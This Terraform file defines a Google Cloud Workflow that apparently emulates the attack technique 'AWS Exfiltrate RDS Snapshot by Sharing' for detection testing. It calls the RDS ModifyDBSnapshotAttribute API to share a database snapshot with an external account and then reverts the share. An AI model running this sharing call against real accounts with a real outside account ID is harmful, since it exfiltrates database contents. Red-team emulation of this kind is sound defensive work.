data "google_service_account" "workflows-to-cloudrun-sa" {
  account_id   = "workflows-to-cloudrun-sa"

}

data "aws_region" "current" {}

resource "google_workflows_workflow" "workflow_to_invoke_aws-rds_share_snapshot_attack" {
  name            = "aws-rds-share-snapshot-srt"
  description     = "A  workflow intended to match the functionality of the  Status Red Team attack technique 'AWS Exfiltrate RDS Snapshot by Sharing': https://stratus-red-team.cloud/attack-techniques/AWS/aws.exfiltration.rds-share-snapshot/"
  service_account = data.google_service_account.workflows-to-cloudrun-sa.id
  project         = var.projectId
  source_contents = <<-EOF

######################################################################################
## Attack Description
######################################################################################

## This attack shares an RDS Snapshot with an external, fictitious AWS account, (012345678912)
## This module then reverts the share with the default user.

#####################################################################################
## Input
######################################################################################
##### INPUT: {"user":"user01"}
##### INPUT: {"user":"user02"}


######################################################################################
## User Agent
######################################################################################
#### Workflow executes with the User-Agent string: "AWS-Share-RDS-Snapshot-WORKFLOWEXECUTIONID"



######################################################################################
## Main Workflow Execution
######################################################################################
main:
  params: [args]
  steps:
    - assign:
        assign:
          - user: $${args.user}
          - projectID: $${sys.get_env("GOOGLE_CLOUD_PROJECT_ID")}  
    - getCloudRunURL:
        call: googleapis.run.v2.projects.locations.services.get
        args:
          name: '$${"projects/"+projectID+"/locations/us-central1/services/aws-proxy-app"}'
        result: appEndpoint 
    - ModifySnapshotAttribute:
        call: ModifySnapshotAttribute
        args:
            user: $${user}
            appEndpoint: $${appEndpoint.uri}
        result: response
    - RevertSnapshotAttribute:
        call: RevertSnapshotAttribute
        args:
            appEndpoint: $${appEndpoint.uri}
        result: revertResponse
    - return:
        return: $${response}


######################################################################################
## Submodules | Sub-Workflows
######################################################################################
ModifySnapshotAttribute:
  params: [user, appEndpoint]
  steps:  
    - ModifySnapshotAttribute:
        try:
            steps:
                - callModifySnapshotAttribute:
                    call: http.post
                    args:
                      url: '$${appEndpoint+"/submitRequest"}'
                      auth:
                          type: OIDC
                      headers:
                          User-Agent: "DeRF-AWS-Share-RDS-Snapshot"
                      body:
                          HOST: "rds.${data.aws_region.current.name}.amazonaws.com"
                          REGION: ${data.aws_region.current.name}
                          SERVICE: "rds" 
                          ENDPOINT: "https://rds.${data.aws_region.current.name}.amazonaws.com"
                          BODY: "Action=ModifyDBSnapshotAttribute&Version=2014-10-31&DBSnapshotIdentifier=derf-rds-snapshot-share&AttributeName=restore&ValuesToAdd.AttributeValue.1=111122223333"
                          UA: '$${"AWS-Share-RDS-Snapshot=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
                          CONTENT: "application/x-www-form-urlencoded; charset=utf-8"
                          USER: $${user}
                          VERB: POST
                    result: response
                - checkNotOK:   
                    switch:
                      - condition: $${response.body.responseCode == 404}
                        raise: $${response}
                      - condition: $${response.body.responseCode == 400}
                        raise: $${response}
                    
        retry:
            predicate: $${custom_predicate}
            max_retries: 3
            backoff:
                initial_delay: 1
                max_delay: 30
                multiplier: 2

    - handle_result:
        switch:
          - condition: $${response.body.responseCode == 200}
            next: returnValidation
          - condition: $${response.body.responseCode == 403}
            next: permissionError
          - condition: $${response.body.responseCode == 404}
            next: cantFind
          - condition: $${response.body.responseCode == 400}
            next: invalidState

    - returnValidation:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "SUCCESS - DeRF Share RDS Snapshot Externally Attack Technique"

    - permissionError:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - DeRF Share RDS Snapshot Externally Attack Technique| This is typically a permission error"
    - cantFind:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE -  DeRF Share RDS Snapshot Externally Attack Technique | Can't find snapshot - something wrong with the perpetual range infrastructure"
    - invalidState:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE -  DeRF Share RDS Snapshot Externally Attack Technique | Invalid snapshot state"



RevertSnapshotAttribute:
  params: [appEndpoint]
  steps:  
    - RevertSnapshotAttribute:
        try:
            steps:
                - callRevertSnapshotAttribute:
                    call: http.post
                    args:
                      url: '$${appEndpoint+"/submitRequest"}'
                      auth:
                          type: OIDC
                      headers:
                          User-Agent: "DeRF-AWS-Share-RDS-Snapshot"
                      body:
                          HOST: "rds.${data.aws_region.current.name}.amazonaws.com"
                          REGION: ${data.aws_region.current.name}
                          SERVICE: "rds" 
                          ENDPOINT: "https://rds.${data.aws_region.current.name}.amazonaws.com"
                          BODY: "Action=ModifyDBSnapshotAttribute&Version=2014-10-31&DBSnapshotIdentifier=derf-rds-snapshot-share&AttributeName=restore&ValuesToRemove.AttributeValue.1=111122223333"
                          UA: '$${"AWS-Share-RDS-Snapshot=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
                          CONTENT: "application/x-www-form-urlencoded; charset=utf-8"
                          VERB: POST
                    result: response
                - checkNotOK:   
                    switch:
                      - condition: $${response.body.responseCode == 404}
                        raise: $${response}
                      - condition: $${response.body.responseCode == 400}
                        raise: $${response}
                    
        retry:
            predicate: $${custom_predicate}
            max_retries: 3
            backoff:
                initial_delay: 1
                max_delay: 30
                multiplier: 2

    - handle_result:
        switch:
          - condition: $${response.body.responseCode == 200}
            next: returnValidation
          - condition: $${response.body.responseCode == 403}
            next: permissionError
          - condition: $${response.body.responseCode == 404}
            next: cantFind
          - condition: $${response.body.responseCode == 400}
            next: invalidState

    - returnValidation:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "SUCCESS - DeRF Share RDS Snapshot Externally Attack Technique"

    - permissionError:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - DeRF Share RDS Snapshot Externally Attack Technique| This is typically a permission error"
    - cantFind:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE -  DeRF Share RDS Snapshot Externally Attack Technique | Can't find snapshot - something wrong with the perpetual range infrastructure"
    - invalidState:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE -  DeRF Share RDS Snapshot Externally Attack Technique | Invalid snapshot state"


custom_predicate:
  params: [response]
  steps:
    - what_to_repeat:
        switch:
          - condition: $${response.body.responseCode == 400}
            return: true
          - condition: $${response.body.responseCode == 409}
            return: true
          - condition: $${response.body.responseCode == 500}
            return: true
    - otherwise:
        return: false


  EOF

}